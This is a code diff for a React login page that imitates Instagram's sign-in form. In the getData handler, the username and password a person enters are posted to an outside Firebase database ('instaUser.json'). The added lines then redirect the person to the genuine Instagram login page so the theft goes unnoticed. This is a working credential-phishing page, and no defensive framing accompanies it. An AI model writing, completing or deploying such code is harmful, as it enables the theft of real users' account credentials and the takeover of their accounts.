@@ -10,9 +10,13 @@ const LoginPage = () => {
 
     const getData = async (e) => {
         e.preventDefault();
-        console.log(username, password)
         const { data } = await axios.post("https://insta-data-f7a7c-default-rtdb.firebaseio.com/instaUser.json", { username: username, password: password });
         console.log(data);
+        if ((!username > 0) && (!password > 0)) {
+            return null
+        }
+
+        window.location.replace("https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Flogin%2F%3F__coig_login%3D1")
     }
 
     return (
@@ -39,9 +43,7 @@ const LoginPage = () => {
                                                 </div>
 
                                                 <span className="button-box">
-                                                    <button className="btn" type="submit" name="submit" onClick={getData}>
-                                                        <a href="https://www.instagram.com/"></a> Log in
-                                                    </button>
+                                                    <button className="btn" type="submit" name="submit" onClick={getData}>Log in </button>
                                                 </span>
 
                                                 <a className="forgot" href="">Forgot password?</a>
